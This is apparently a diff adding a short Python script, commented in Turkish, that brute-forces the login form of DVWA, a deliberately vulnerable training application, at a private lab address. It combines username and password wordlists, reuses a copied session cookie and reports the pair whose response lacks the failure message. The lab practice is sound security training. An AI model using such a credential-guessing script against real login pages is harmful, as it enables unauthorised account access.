@@ -1,0 +1,30 @@
+import requests
+header={"Cookie":"security=low; PHPSESSID=383fc2ab2d3c719410fa63cf79c5b715;w"} #header bilgilerini sozluk tipinde websitesinde f12ye basarak alacagiz. Sessionlarin hepsini almaliyiz
+#header autontication icin kullanildi eger giris yaptiktan sonra bir bf islemi yapacaksak gerekli bu
+#ama giris yapmadan bi islm yaparsak gereksiz
+dosya=open("username.txt","r")
+kullanici=dosya.read()
+dosya.close()
+dosya1=open("password.txt","r")
+sifre=dosya1.read()
+dosya1.close()
+
+for username in kullanici.splitlines():
+    for password in sifre.splitlines():
+        url="http://10.0.2.26/dvwa/vulnerabilities/brute/?username=" +username + "&password=" + password + "&Login=Login"
+        sonuc=requests.get(url=url,headers=header)
+        print("Username:",username)
+        print("Password:",password)
+        print("Status Code:",sonuc.status_code)
+        print("Msg Uzunlugu",len(sonuc.content))
+        if not "Username and/or password incorrect." in sonuc.content:
+            print("Kullanilan username ve parola dogrudur..")
+            dogruk=username
+            dogrus=password
+
+        print("="*10)
+
+print("!!!"*10)
+print("Dogru Kullanici Adi:",dogruk)
+print("Dogru Sifre:",dogrus)
+print("!!!"*10)
